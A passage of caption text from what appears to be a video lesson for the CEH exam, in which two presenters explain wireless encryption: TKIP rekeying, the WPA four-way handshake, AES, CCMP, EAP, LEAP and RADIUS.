nice.\n\n406\n00:18:20.830 --> 00:18:22.480\nWe're iterating that way.\n\n407\n00:18:22.480 --> 00:18:25.530\nEnhances essentially\nthe rekeying mechanism in WEP.\n\n408\n00:18:25.530 --> 00:18:29.769\nSo we are re-keying which is the other\nbig protection every 10,000 packets.\n\n409\n00:18:29.769 --> 00:18:31.581\nWe re-key, we swap the keys.\n\n410\n00:18:31.581 --> 00:18:34.971\nSo even if there is an ability\nto be able observe and\n\n411\n00:18:34.971 --> 00:18:37.245\nperhaps figure out the pattern.\n\n412\n00:18:37.245 --> 00:18:40.064\nAfter 10,000 packets,\nwhich is a very small amount of data,\n\n413\n00:18:40.064 --> 00:18:41.010\nthe keys are swapped.\n\n414\n00:18:41.010 --> 00:18:44.040\nBut the problem is the key\nspace is still not big enough.\n\n415\n00:18:44.040 --> 00:18:48.240\nSo if we have enough traffic and we can\ngenerate enough traffic to overwhelm\n\n416\n00:18:48.240 --> 00:18:51.346\nthe system to the point that every\n10,000 packets we regenerate.\n\n417\n00:18:51.346 --> 00:18:56.060\nAnd we essentially cycle through\nmassive numbers of keys quickly,\n\n418\n00:18:56.060 --> 00:18:58.130\nwe still can ultimately break the system.\n\n419\n00:18:58.130 --> 00:19:02.030\nWhich was, again, one of the ultimate\ndownfalls and weaknesses with TKIP.\n\n420\n00:19:02.030 --> 00:19:03.990\nSo that was a little bit\nof a challenge there.\n\n421\n00:19:03.990 --> 00:19:08.260\nWe have this idea of the temporal keys\nthat we talked about in WPA and WPA2.\n\n422\n00:19:08.260 --> 00:19:11.440\nJust wanted to drill in a little\nbit more on the concept of temporal\n\n423\n00:19:11.440 --> 00:19:12.380\nkeys-\n&gt;&gt; Mm-hm.\n\n424\n00:19:12.380 --> 00:19:13.830\n&gt;&gt; So [COUGH] When we think about this,\n\n425\n00:19:13.830 --> 00:19:16.190\nthe encryption keys,\nthe temporal keys, right.\n\n426\n00:19:16.190 --> 00:19:18.366\nWe derive them during what's\ncalled a four-way handshake.\n\n427\n00:19:18.366 --> 00:19:19.842\nAnd I wanted to just kinda drill down and\n\n428\n00:19:19.842 --> 00:19:21.890\nexplain the four-way\nhandshake a little bit.\n\n429\n00:19:21.890 --> 00:19:24.670\nA little bit different than the three-way\nhandshake we often refer to.\n\n430\n00:19:24.670 --> 00:19:29.770\nA little bit different than the ROSA DORA\nfour-way process we talk about with DHCP.\n\n431\n00:19:29.770 --> 00:19:31.400\nSo wanna differentiate here, again,\n\n432\n00:19:31.400 --> 00:19:34.010\ngive you a little bit more\ninformation than you may need.\n\n433\n00:19:34.010 --> 00:19:34.960\nSo let's go down.\n\n434\n00:19:34.960 --> 00:19:35.640\nLet's take a look.\n\n435\n00:19:35.640 --> 00:19:37.680\nWe got the four steps down there.\n\n436\n00:19:37.680 --> 00:19:38.629\nAt least first two anyway.\n\n437\n00:19:39.890 --> 00:19:43.800\nSo we see that in step one,\nthe AP, which is the access point.\n\n438\n00:19:43.800 --> 00:19:45.290\nRemember, we're talking about wireless,\nright.\n\n439\n00:19:45.290 --> 00:19:49.910\nSo the access point sends an ANonce to\nthe client which uses its construct.\n\n440\n00:19:49.910 --> 00:19:53.700\nWhich uses it to construct, excuse me,\nwhat's called the pairwise transient key.\n\n441\n00:19:53.700 --> 00:19:55.010\nWhat's called the PTK.\n\n442\n00:19:55.010 --> 00:19:57.670\nNow before we do anything else\nwe didn't define the term nonce.\n\n443\n00:19:57.670 --> 00:20:00.030\nLet me quickly just explain the concept.\n\n444\n00:20:00.030 --> 00:20:00.890\nIt's very simple.\n\n445\n00:20:00.890 --> 00:20:03.430\nA nonce is essentially a piece\nof data we use one time and\n\n446\n00:20:03.430 --> 00:20:06.560\nthrow away, whatever that may be.\n\n447\n00:20:06.560 --> 00:20:09.900\nIt's a piece of data that transits\nthrough our system, used one time,\n\n448\n00:20:09.900 --> 00:20:11.970\nand essentially as a result\nis not used again.\n\n449\n00:20:11.970 --> 00:20:15.090\nSo when we say an ANonce we talk\nabout a special kind of nonce, or\n\n450\n00:20:15.090 --> 00:20:19.620\nan SNonce, we'll talk about here in\na minute in step two I believe, right?\n\n451\n00:20:19.620 --> 00:20:20.160\nWe got it down there?\n&gt;&gt; Mm-hm.\n\n452\n00:20:20.160 --> 00:20:20.850\nYep.\n&gt;&gt; Yeah.\n\n453\n00:20:20.850 --> 00:20:22.230\nSo, these are just different kinds of\n\n454\n00:20:22.230 --> 00:20:26.070\nnonces that are used in certain steps.\nThey're one-time use data\n\n455\n00:20:26.070 --> 00:20:28.780\nthat is generating some value for\nus we use to,\n\n456\n00:20:28.780 --> 00:20:32.530\nthen, propagate into the creation\nof a key, or something like that.\n\n457\n00:20:32.530 --> 00:20:34.500\nAnd then that value just goes away,\nthat's all it is.\n\n458\n00:20:34.500 --> 00:20:35.980\n&gt;&gt; Kind of like a seed\nvalue of some kind or-\n\n459\n00:20:35.980 --> 00:20:37.220\n&gt;&gt; Could be like a seed value,\n\n460\n00:20:37.220 --> 00:20:38.010\nyou think of it that way.\n\n461\n00:20:38.010 --> 00:20:42.440\nBut nonce is an actual cryptographic\nterm specifically as a vocabulary item.\n\n462\n00:20:42.440 --> 00:20:44.080\nIt just means a piece\nof data used one time.\n\n463\n00:20:44.080 --> 00:20:48.900\nThat's just what the formal definition is\nin case you are just wondering about that.\n\n464\n00:20:48.900 --> 00:20:53.270\nSo step two, client response with its own\nnonce value, called an SNonce, right.\n\n465\n00:20:53.270 --> 00:20:57.160\nAnd then the AP, or rather back to the AP,\ntogether with the Message Integrity Code.\n\n466\n00:20:57.160 --> 00:20:57.915\nWe know what the MIC is.\n\n467\n00:20:57.915 --> 00:21:00.450\nWe've talked about that before\nup in the web conversation.\n\n468\n00:21:00.450 --> 00:21:03.095\nIn step three,\nAP then sends the Group Transient Key.\n\n469\n00:21:03.095 --> 00:21:07.020\nWhat's called the GTK,\nas opposed to the Pairwise Transient Key,\n\n470\n00:21:07.020 --> 00:21:09.360\nthe PTK generated in step one.\n\n471\n00:21:09.360 --> 00:21:14.290\nSo the Group Transient Key, and\nthen a sequence number together.\n\n472\n00:21:14.290 --> 00:21:17.210\nThat and a sequence number I should\nsay together with another MIC.\n\n473\n00:21:17.210 --> 00:21:20.710\nWhich is used in the next broadcast frame,\nthe frame that we then broadcast out.\n\n474\n00:21:20.710 --> 00:21:22.440\nAnd then we step forward\nof the frame we broadcast.\n\n475\n00:21:22.440 --> 00:21:25.240\nClient is confirming that the temporal\nkeys have been installed and\n\n476\n00:21:25.240 --> 00:21:25.970\nare then used.\n\n477\n00:21:25.970 --> 00:21:29.867\nSo, this is actually how the TKIP process,\nthe temporal keys,\n\n478\n00:21:29.867 --> 00:21:32.911\nare generated and\nultimately associated in WPA.\n\n479\n00:21:32.911 --> 00:21:36.345\nAnd, if we were using it, in WPA2.\n\n480\n00:21:36.345 --> 00:21:39.460\nSo just wanted to drill down on that a\nlittle bit for you to give you that idea.\n\n481\n00:21:40.630 --> 00:21:41.190\nWe have WPA.\n\n482\n00:21:41.190 --> 00:21:44.450\nThis is what comes after WEP as we said,\nright.\n\n483\n00:21:44.450 --> 00:21:47.950\nSo it's kind of considered an advanced\nstage two thought process.\n\n484\n00:21:47.950 --> 00:21:50.830\nWe have WPA2 which is\nmore advanced than WPA.\n\n485\n00:21:50.830 --> 00:21:53.895\nUsing TKIP, MIC, and\nAES as we talked about.\n\n486\n00:21:53.895 --> 00:21:58.660\n48-bit IV, 32 bit CRC, and ultimately\nTKIP encryption as we talked about.\n\n487\n00:21:58.660 --> 00:22:01.480\nNow before we go forward let's\ntalk about AES for a second.\n\n488\n00:22:01.480 --> 00:22:02.930\nI know we're gonna define it later.\n\n489\n00:22:02.930 --> 00:22:04.560\nWe'll come to it in the list.\n\n490\n00:22:04.560 --> 00:22:08.290\nAES, the advanced encryption standard,\nis the algorithm that has replaced DES,\n\n491\n00:22:08.290 --> 00:22:09.910\nthe data encryption standard.\n\n492\n00:22:09.910 --> 00:22:12.430\nYou may notice triple DES, 3-DES.\n\n493\n00:22:12.430 --> 00:22:17.320\nAnd as a result, is now\nthe encryption algorithm of choice for\n\n494\n00:22:17.320 --> 00:22:18.730\nconfidential and secret data.\n\n495\n00:22:18.730 --> 00:22:21.860\nAnd is recommended and\nis used in these systems today.\n\n496\n00:22:21.860 --> 00:22:25.340\nSo WPA2 Enterprise uses AES.\n\n497\n00:22:25.340 --> 00:22:28.130\nWe implemented or\ncan implement it with IPSec for instance.\n\n498\n00:22:28.130 --> 00:22:31.960\nAnd we talked about a lot of this in\nthe cryptography conversations again.\n\n499\n00:22:31.960 --> 00:22:34.660\nWe talked about it in some of\nthe earlier episodes and footprinting.\n\n500\n00:22:34.660 --> 00:22:36.140\nAnd some of the stuff we\ndid with scanning and\n\n501\n00:22:36.140 --> 00:22:37.550\nthings like that where we\ntalked about some of these.\n\n502\n00:22:37.550 --> 00:22:39.340\nSo just be aware of that.\n\n503\n00:22:39.340 --> 00:22:41.050\nHow does WPA work, you may ask.\n\n504\n00:22:41.050 --> 00:22:41.780\nI'm glad you did.\n\n505\n00:22:41.780 --> 00:22:42.450\nThank you very much.\n\n506\n00:22:42.450 --> 00:22:43.130\n&gt;&gt; How does it work?\n\n507\n00:22:43.130 --> 00:22:46.250\n&gt;&gt; It was that whole ESP thing\nthat we were talking about.\n\n508\n00:22:46.250 --> 00:22:46.851\n&gt;&gt; [LAUGH]\n&gt;&gt; All right.\n\n509\n00:22:46.851 --> 00:22:48.965\nSo, what we do there and\nwe'll see, we take a look,\n\n510\n00:22:48.965 --> 00:22:51.529\nwe kinda walk down a lot of this,\nwe've talked about already.\n\n511\n00:22:51.529 --> 00:22:53.167\nBut we just want to throw it out there and\n\n512\n00:22:53.167 --> 00:22:56.000\nmake sure you can see all\nthe different sequencing involved.\n\n513\n00:22:56.000 --> 00:22:59.886\nThe temporal encryption key,\nthe transmit address, and\n\n514\n00:22:59.886 --> 00:23:03.780\nthe TKIP sequence counter,\nthat what's called the TSK.\n\n515\n00:23:03.780 --> 00:23:06.799\nAs you could see they're\nused to all provide\n\n516\n00:23:06.799 --> 00:23:10.560\ninput into the RC4 algorithm\ngenerating keystream.\n\n517\n00:23:10.560 --> 00:23:12.040\nWe talked about this earlier.\n\n518\n00:23:12.040 --> 00:23:17.060\nThe MAC service data unit, what's called\nthe MSDU, and the Message Integrity Check,\n\n519\n00:23:17.060 --> 00:23:20.175\nthe MIC, are combined using an algorithm\ncalled the Michael algorithm.\n\n520\n00:23:20.175 --> 00:23:23.720\nIt's a special algorithm used\ninternally to move data and secure it.\n\n521\n00:23:23.720 --> 00:23:27.350\nThe combination of the MSDU and MIC is\nfragmented to generate what's called\n\n522\n00:23:27.350 --> 00:23:30.380\nthe MAC Protocol Data Unit, the MPDU.\n\n523\n00:23:30.380 --> 00:23:31.150\nAlphabet soup right?\n\n524\n00:23:31.150 --> 00:23:31.650\n[LAUGH]\n&gt;&gt; Right.\n\n525\n00:23:31.650 --> 00:23:35.007\n[LAUGH] &gt;&gt; It's good that you don't\nhave to remember acronyms for\n\n526\n00:23:35.007 --> 00:23:37.100\nan exam like this.\nYou would go nuts.\n\n527\n00:23:37.100 --> 00:23:41.120\nAnd then a 32 bit integrity check via\nwhat's called the ICV is calculated\n\n528\n00:23:41.120 --> 00:23:43.720\nto represent and attach to the MPDU.\n\n529\n00:23:43.720 --> 00:23:45.214\nThe combinaton of the MPDU and\n\n530\n00:23:45.214 --> 00:23:49.053\nICV is then XORed with Keystream to\nproduce ultimately the encrypted data.\n\n531\n00:23:49.053 --> 00:23:52.293\nAnd the IV is added to the encrypted\ndata to generate the MAC frame\n\n532\n00:23:52.293 --> 00:23:53.430\nas we talked about.\n\n533\n00:23:53.430 --> 00:23:57.064\nSo this is the under the hood, hey how\ndoes it work, let's go step by step,\n\n534\n00:23:57.064 --> 00:23:58.871\nbreak it down kind of conversation.\n\n535\n00:23:58.871 --> 00:24:02.016\nWhat would I take away from these\nconversations as we're breaking stuff\n\n536\n00:24:02.016 --> 00:24:02.642\ndown for you?\n\n537\n00:24:02.642 --> 00:24:05.847\nHow much of this would I\ngo into detail in theory?\n\n538\n00:24:05.847 --> 00:24:08.092\nHow much what I wanna know.\n\n539\n00:24:08.092 --> 00:24:12.969\nIf I was you and I was studying to become\na CEHS as I think a lot of you hopefully\n\n540\n00:24:12.969 --> 00:24:15.680\nwill want to do and\ntake the time to do, and\n\n541\n00:24:15.680 --> 00:24:20.890\nI was worried about would I see this level\nof specificity in detail, on an exam.\n\n542\n00:24:22.110 --> 00:24:26.150\nObviously, no way to know it for\nsure, certainly, but it's a good bet\n\n543\n00:24:26.150 --> 00:24:30.770\nthat vocabulary knowledge, that tactical\nknowledge of how things execute,\n\n544\n00:24:30.770 --> 00:24:34.120\nhow they are processed,\nis never a bad thing to have.\n\n545\n00:24:34.120 --> 00:24:37.800\nWould I go into the specificity\nof step-by-step detail,\n\n546\n00:24:37.800 --> 00:24:41.390\non something like WEP,\nwhich is not use anymore.\n\n547\n00:24:41.390 --> 00:24:46.320\nI would probably wanna understand\nthe downfalls of WEP, the short IV,\n\n548\n00:24:46.320 --> 00:24:50.280\nthe bad implementation in\nterms of keys space with RC4.\n\n549\n00:24:50.280 --> 00:24:54.435\nI would wanna know how we fix\nWEP by using WPA with TKIP.\n\n550\n00:24:54.435 --> 00:24:59.451\nI would probably wanna understand TKIP\na little bit, I'd wanna understand the use\n\n551\n00:24:59.451 --> 00:25:04.740\nof a bigger IV, the use of RC4 but with\n128 bit key as opposed to a smaller key.\n\n552\n00:25:04.740 --> 00:25:07.191\nI'd wanna know the value of a MIC and\nwhat a MIC is and\n\n553\n00:25:07.191 --> 00:25:09.027\nthe initialization vector, right.\n\n554\n00:25:09.027 --> 00:25:13.494\nI wanna know those details what I\nget into the idea of the MPDU and\n\n555\n00:25:13.494 --> 00:25:16.540\nall that and the temporal key discussion.\n\n556\n00:25:16.540 --> 00:25:19.050\nI probably wanna know a little\nbit about temporal keys I said I\n\n557\n00:25:19.050 --> 00:25:21.880\nprobably wanna understand the basic\nblocking and tackling there.\n\n558\n00:25:21.880 --> 00:25:23.930\nWould I wanna differentiate\nbetween an ANonce and\n\n559\n00:25:23.930 --> 00:25:26.050\nan SNonce and know which is which,\n\n560\n00:25:26.050 --> 00:25:31.080\nwhich is associated with essentially\nthe starting process and then and that?\n\n561\n00:25:31.080 --> 00:25:32.550\nI may not go to that level of detail.\n\n562\n00:25:32.550 --> 00:25:36.393\nI mean, if you do this every day,\nobviously it's stuff you know,\n\n563\n00:25:36.393 --> 00:25:39.002\nI can tell you that when\nI do discuss this when I\n\n564\n00:25:39.002 --> 00:25:41.832\nhave conversations with\ncustomers about this.\n\n565\n00:25:41.832 --> 00:25:45.864\nIf I do a training regarding these kinds\nof protocols and I have to discuss it with\n\n566\n00:25:45.864 --> 00:25:49.836\nstudents, I will drill down to that level\nof detail that we just shared with you\n\n567\n00:25:49.836 --> 00:25:53.566\nhere to help them to understand it and\nwill work through it, but I would not\n\n568\n00:25:53.566 --> 00:25:58.040\nexpect that you would be asked a lot of\nquestions about that level of specificity.\n\n569\n00:25:58.040 --> 00:26:01.040\nBut it would be good for you to at least\nhave a working knowledge of the higher\n\n570\n00:26:01.040 --> 00:26:04.120\nlevel concepts, maybe if that's\na good way to framing that.\n\n571\n00:26:04.120 --> 00:26:06.754\nSpeaking of which, we do have some\nadditional high level concepts that we\n\n572\n00:26:06.754 --> 00:26:07.911\nwanna continue talking about.\n\n573\n00:26:07.911 --> 00:26:11.660\nSo we see WPA2, we see WPA2 Enterprise.\n\n574\n00:26:11.660 --> 00:26:13.600\nWe have talked about\nsome of these already.\n\n575\n00:26:13.600 --> 00:26:16.470\nWPA2 uses the AES algorithms, as I said.\n\n576\n00:26:16.470 --> 00:26:21.490\nAnd also CCMP,\nwhich we'll talk about here in a minute.\n\n577\n00:26:21.490 --> 00:26:24.260\nFor wireless data encryption,\njust another protocol.\n\n578\n00:26:24.260 --> 00:26:28.210\nWPA2 Enterprise is WPA2 with\nadditional capabilities.\n\n579\n00:26:28.210 --> 00:26:30.750\nWe use EAP, the encapsulation.\n\n580\n00:26:30.750 --> 00:26:32.250\n&gt;&gt; Extensible authentication?\n\n581\n00:26:32.250 --> 00:26:32.802\n&gt;&gt; I'm sorry.\nYeah,\n\n582\n00:26:32.802 --> 00:26:34.181\nsorry, I'm thinking\nencapsulation [INAUDIBLE].\n\n583\n00:26:34.181 --> 00:26:37.169\n&gt;&gt; [LAUGH]\n&gt;&gt; Extensible Authentication Protocol is\n\n584\n00:26:37.169 --> 00:26:39.292\nwhat EAP stands for with WPA2.\n\n585\n00:26:39.292 --> 00:26:43.880\nAnd we also require the use of a radius\nsystem with WPA2 Enterprise, specifically.\n\n586\n00:26:43.880 --> 00:26:45.020\nSo just be aware of that.\n\n587\n00:26:45.020 --> 00:26:46.100\nThe nice thing about EAP,\n\n588\n00:26:46.100 --> 00:26:49.890\nthe Extensible Authentication Protocol,\nis that it's actually a framework.\n\n589\n00:26:49.890 --> 00:26:54.190\nWe call it a protocol, but it's not really\na protocol in every sense of the word,\n\n590\n00:26:54.190 --> 00:26:58.450\nit is really a framework that is an open,\nI almost think of it like an API.\n\n591\n00:26:58.450 --> 00:27:00.190\nIt's not an API, I wanna be clear.\n\n592\n00:27:00.190 --> 00:27:05.703\nBut it really is like an API,\nin the sense that it's an extensible,\n\n593\n00:27:05.703 --> 00:27:09.496\nhence the name,\nopen port that we can bind to.\n\n594\n00:27:09.496 --> 00:27:12.400\nAnd port is not probably not the right\nterm to use there because it's not a port.\n\n595\n00:27:12.400 --> 00:27:15.340\nWhat I'm just trying to give you a mental\nimage of as I describe it, is think\n\n596\n00:27:15.340 --> 00:27:18.534\nof it as a universal connector, maybe\nthat's a better way of thinking about it.\n\n597\n00:27:18.534 --> 00:27:21.230\n&gt;&gt; I can come up with my\nown authentication method.\n\n598\n00:27:21.230 --> 00:27:25.200\nMaybe I wanna identify somebody by\nthe temperature of their finger.\n\n599\n00:27:25.200 --> 00:27:28.360\nBut I could take that information,\nrun it through there.\n\n600\n00:27:28.360 --> 00:27:29.470\n&gt;&gt; Temperature of my finger.\n\n601\n00:27:29.470 --> 00:27:31.333\n&gt;&gt; Is 98.67.\n\n602\n00:27:31.333 --> 00:27:32.094\n&gt;&gt; Now I'm wiggling it.\n&gt;&gt; You're a little warm.\n\n603\n00:27:32.094 --> 00:27:33.805\n&gt;&gt; It's probably higher.\n\n604\n00:27:33.805 --> 00:27:35.458\n&gt;&gt; [LAUGH]\n&gt;&gt; Near field wireless,\n\n605\n00:27:35.458 --> 00:27:36.767\nin finger authentication.\n\n606\n00:27:36.767 --> 00:27:38.371\n&gt;&gt; But it is open.\n&gt;&gt; That's good.\n\n607\n00:27:38.371 --> 00:27:38.871\nRight.\n&gt;&gt; So I could make my own stuff to\n\n608\n00:27:38.871 --> 00:27:40.218\nconnect.\n&gt;&gt; You can, exactly.\n\n609\n00:27:40.218 --> 00:27:40.778\nAnd what it is,\n\n610\n00:27:40.778 --> 00:27:45.020\nis it essentially gives us the ability\nto be able to create not just\n\n611\n00:27:45.020 --> 00:27:49.330\nas Mike was saying was absolutely correct\nspot on with this, not just authentication\n\n612\n00:27:49.330 --> 00:27:52.930\nthat we use as industry center that we\nused today, but something that we make\n\n613\n00:27:52.930 --> 00:27:57.230\ncraft ourselves to proprietary APIs but\nalso whatever comes in the future.\n\n614\n00:27:57.230 --> 00:28:00.470\nIt's really just an open where\nin open place that we can\n\n615\n00:28:00.470 --> 00:28:03.060\npin our new authentication\nconcepts too and\n\n616\n00:28:03.060 --> 00:28:05.250\nthen integrate them into\nthe system going forward.\n\n617\n00:28:05.250 --> 00:28:06.960\nSo, it's actually a really cool concept.\n\n618\n00:28:06.960 --> 00:28:10.910\nIt's been around for a long time,\nit brings in for instance the use of smart\n\n619\n00:28:10.910 --> 00:28:13.730\ncard authentication,\nbiometrics, just to name a few.\n\n620\n00:28:13.730 --> 00:28:16.960\nThings that have gone through\nEAP to be used recently.\n\n621\n00:28:16.960 --> 00:28:21.420\nAnd so it is a total extensibility\nframework, and that's really what it is.\n\n622\n00:28:21.420 --> 00:28:24.630\nWe refer to it as a protocol cuz\nit does get implemented that way,\n\n623\n00:28:24.630 --> 00:28:28.120\nto allow those solutions to\nactually bind and be workable.\n\n624\n00:28:28.120 --> 00:28:32.855\nBut it really is defined when\nyou read the specificity,\n\n625\n00:28:32.855 --> 00:28:35.445\nthe standards and\nall the things associated with the AP.\n\n626\n00:28:35.445 --> 00:28:37.562\nWhen you read through the documentation,\n\n627\n00:28:37.562 --> 00:28:40.442\nyou actually will often hear\nreferred to as a framework for\n\n628\n00:28:40.442 --> 00:28:44.407\nauthentication not only today, but\nan extensible framework into the future.\n\n629\n00:28:44.407 --> 00:28:45.780\nSo we just wanna make sure\nthat you're aware of that.\n\n630\n00:28:45.780 --> 00:28:49.330\nSo that's what EAP is, just so\nyou know what it is, and you've seen that.\n\n631\n00:28:49.330 --> 00:28:50.460\nAnd boom, we're back.\n\n632\n00:28:50.460 --> 00:28:52.970\nLet me try that again,\nhold on, she wasn't ready.\n\n633\n00:28:52.970 --> 00:28:55.200\nOne more time, and there we go.\n\n634\n00:28:55.200 --> 00:28:58.307\nOkay, awesome, we gotta make\nsure we sync that up, all right.\n\n635\n00:28:58.307 --> 00:29:02.123\nOkay, so, CCMP right,\nwe use this as well 128-bit keys,\n\n636\n00:29:02.123 --> 00:29:04.571\n48-bit IV with replay detection, so\n\n637\n00:29:04.571 --> 00:29:09.220\nobviously very important it's another\nprotocol with throw in the mix.\n\n638\n00:29:09.220 --> 00:29:14.120\nAS as we talked about symmetric-key\nencryption using WPA2, replaces TKIP,\n\n639\n00:29:14.120 --> 00:29:14.990\nas I mentioned.\n\n640\n00:29:14.990 --> 00:29:20.100\nLEAP is a proprietary thought process\ncoming out of Cisco, for WLAN,\n\n641\n00:29:20.100 --> 00:29:21.730\nwireless LAN, authentication.\n\n642\n00:29:21.730 --> 00:29:24.200\nNot the LEAP devices that were\nall the rage a couple years ago,\n\n643\n00:29:24.200 --> 00:29:25.860\nthe new wireless near field.\n\n644\n00:29:25.860 --> 00:29:28.540\nStuff so you can remote control I\nactually bought one of those by the way.\n\n645\n00:29:28.540 --> 00:29:29.700\n&gt;&gt; Did you.\n&gt;&gt; Yeah cuz I saw it and\n\n646\n00:29:29.700 --> 00:29:32.350\nI'm thinking I'm teaching this will be so\ncool.\n\n647\n00:29:32.350 --> 00:29:36.910\nLet me hook this thing up to my computer,\nthe LEAP device was this idea of basically\n\n648\n00:29:36.910 --> 00:29:40.870\na receiver that you would plug into the\ncomputer and wireless near field you could\n\n649\n00:29:40.870 --> 00:29:43.510\njust walk anywhere and\ncontrol stuff with hand motion.\n\n650\n00:29:43.510 --> 00:29:45.440\nSo I'm thinking, you've seen me teach,\n\n651\n00:29:45.440 --> 00:29:47.230\nI mean I'm tethered here\nI don't really wander.\n\n652\n00:29:47.230 --> 00:29:50.460\nBut, when I'm in class normally\nI'm wandering around everywhere,\n\n653\n00:29:50.460 --> 00:29:51.610\nI'm just all over the place.\n\n654\n00:29:51.610 --> 00:29:53.970\nAnd I don't like clickers and\nstuff like that.\n\n655\n00:29:53.970 --> 00:29:56.630\nSo I thought this would be so cool,\nI could use hand gestures and\n\n656\n00:29:56.630 --> 00:30:00.890\nI could go into my machine, have it up,\nand I could swipe and bring something up.\n\n657\n00:30:00.890 --> 00:30:02.051\nI could be like the cool people on CSI.\n\n658\n00:30:02.051 --> 00:30:03.385\n&gt;&gt; Yeah.\n\n659\n00:30:03.385 --> 00:30:06.100\n&gt;&gt; You do one of these and\nI could throw stuff and be everywhere and\n\n660\n00:30:06.100 --> 00:30:09.020\nhave all the cool graphics,\nbut I'd have to have the $100\n\n661\n00:30:09.020 --> 00:30:12.060\nmillion production facility behind\nme to actually make that work.\n\n662\n00:30:12.060 --> 00:30:13.340\nBut I thought this would be kinda cool so\n\n663\n00:30:13.340 --> 00:30:15.860\nI actually preordered one,\nright before they came out.\n\n664\n00:30:15.860 --> 00:30:17.930\nAnd they kept delaying cuz\nthey had to get it right and\n\n665\n00:30:17.930 --> 00:30:20.450\nthen eventually they said hey, we're\ngetting ready to ship it, they shipped it,\n\n666\n00:30:20.450 --> 00:30:22.770\nhooked it up and it actually was\nreally cool, works really well.\n\n667\n00:30:22.770 --> 00:30:23.840\nYeah, works really well.\n\n668\n00:30:23.840 --> 00:30:25.338\nSo yeah, it's actually pretty cool,\npretty neat.\n\n669\n00:30:25.338 --> 00:30:27.640\n&gt;&gt; Check that out.\n&gt;&gt; Yeah, they're pretty neat.\n\n670\n00:30:27.640 --> 00:30:29.450\nSo anyway that's not the LEAP\nwe're talking about.\n\n671\n00:30:29.450 --> 00:30:33.500\nWe're talking about the Cisco proprietary\nWLAN authentication protocol.\n\n672\n00:30:34.770 --> 00:30:36.310\nWhat if I wasn't ready for\nyou to go back to that?\n\n673\n00:30:36.310 --> 00:30:37.590\nYou just did that on your own.\n\n674\n00:30:37.590 --> 00:30:40.490\nThis is what happens when\nthey take initiative, right?\n\n675\n00:30:40.490 --> 00:30:42.884\nI may have actually wanted to\ncontinue smiling at the camera for\n\n676\n00:30:42.884 --> 00:30:44.392\na second before we actually went back.\n\n677\n00:30:44.392 --> 00:30:46.210\n&gt;&gt; [LAUGH]\n&gt;&gt; You happen to be correct in this case,\n\n678\n00:30:46.210 --> 00:30:47.553\nbut that's not the point, right, so.\n\n679\n00:30:47.553 --> 00:30:48.897\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so we're back,\n\n680\n00:30:48.897 --> 00:30:49.890\nwe're taking about LEAPs.\n\n681\n00:30:49.890 --> 00:30:50.970\nJust make sure you know about LEAP.\n\n682\n00:30:50.970 --> 00:30:51.980\nWe talked about EAP,\n\n683\n00:30:51.980 --> 00:30:55.720\nthe central authentication protocol\nas Mike helped us to understand.\n\n684\n00:30:55.720 --> 00:30:57.550\nYou could see it there, and then RADIUS.\n\n685\n00:30:57.550 --> 00:31:00.980\nI mentioned that we need RADIUS\nassociated with WPA2 Enterprise,\n\n686\n00:31:00.980 --> 00:31:03.540\nRADIUS is often referred to as triple A,\nright.\n\n687\n00:31:03.540 --> 00:31:07.320\nAuthentication, authorization, audit or\nauthentication, authorization, access.\n\n688\n00:31:07.320 --> 00:31:09.360\nYou hear it referred to in\nslightly different terms, but\n\n689\n00:31:09.360 --> 00:31:14.430\nultimately RADIUS solutions are going\nto be the gateway solutions\n\n690\n00:31:14.430 --> 00:31:19.480\nthat we come inbound through for remote\naccess or in this case for wireless that\n\n691\n00:31:19.480 --> 00:31:24.420\nwe will run through to do call accounting\nand management for that information.\n\n692\n00:31:24.420 --> 00:31:27.280\nAnd as a result of that,\nwe can track session, track state.\n\n693\n00:31:27.280 --> 00:31:29.410\nWe can understand who's doing what, where.\n\n694\n00:31:29.410 --> 00:31:33.330\nAnd so RADIUS solutions are part of\nthe WPA2 Enterprise implementation.\n\n695\n00:31:33.330 --> 00:31:36.440\nThe standard actually calls for you to\nuse radius as part of that believe it or\n\n696\n00:31:36.440 --> 00:31:38.360\nnot, so kind of interesting stuff.\n\n697\n00:31:38.360 --> 00:31:42.190\nHopefully cool little romp\nthrough the types of encryption.\n\n698\n00:31:43.290 --> 00:31:44.940\nWe broke down web encryption.\n\n699\n00:31:44.940 --> 00:31:45.940\nTalked about it at length.\n\n700\n00:31:45.940 --> 00:31:48.860\nAnd talked about how it used or\nhow it's used, how it works.\n\n701\n00:31:48.860 --> 00:31:51.650\nWe talked about WEP encryption and\nthe ups and downs and\n\n702\n00:31:51.650 --> 00:31:55.780\nkind of these associated with the broke\ndown WPA and took a look at WPA.\n\n703\n00:31:55.780 --> 00:32:00.769\nTook a look at temporal keys,\nTKIP, WPA, WPA2.\n\n704\n00:32:00.769 --> 00:32:05.500\nWe went through, we talked about\nnot just WPA2, but WPA2 Enterprise.\n\n705\n00:32:05.500 --> 00:32:06.857\nSo we spent a little\ntime talking about that.\n\n706\n00:32:06.857 --> 00:32:08.882\nI think we have a chart,\nthough, that we wanna go to,\n\n707\n00:32:08.882 --> 00:32:12.000\na little table that I know you created for\nus, right, with the encryption types.\n\n708\n00:32:12.000 --> 00:32:14.148\nThe Algorithms, IV size, all that.\n\n709\n00:32:14.148 --> 00:32:15.592\nJust wanna show that real quick.\n\n710\n00:32:15.592 --> 00:32:19.204\nSo we have WEP versus WPA, versus WPA2.\n\n711\n00:32:19.204 --> 00:32:22.572\nHere, you can kind of see just a nice\nlittle layout, a comparison of them,\n\n712\n00:32:22.572 --> 00:32:23.167\nif you will.\n\n713\n00:32:23.167 --> 00:32:26.949\nYou'll see the encryption algorithms\nthat are being used there,\n\n714\n00:32:26.949 --> 00:32:28.237\nin the second column.\n\n715\n00:32:28.237 --> 00:32:31.143\nYou'll see the IV size,\ninitialization vector.\n\n716\n00:32:31.143 --> 00:32:33.999\nYou'll see key length and\nyou'll see integrity check mechanism.\n\n717\n00:32:33.999 --> 00:32:37.095\nSo thought this was just a good\nway to summarize that and\n\n718\n00:32:37.095 --> 00:32:41.014\ngive you that information so\nthat you could have a good sense of that.\n\n719\n00:32:41.014 --> 00:32:44.222\nObviously understanding how that\ncomparison works will be good for\n\n720\n00:32:44.222 --> 00:32:46.708\nyou from a study standpoint,\na review standpoint.\n\n721\n00:32:46.708 --> 00:32:48.911\nAnd I believe we'll make\nthat stuff available.\n\n722\n00:32:48.911 --> 00:32:49.589\n&gt;&gt; Absolutely.\n\n723\n00:32:49.589 --> 00:32:50.980\n&gt;&gt; So they'll be able to have all that.\n\n724\n00:32:50.980 --> 00:32:53.429\nAre you gonna sign that as like\na limited edition 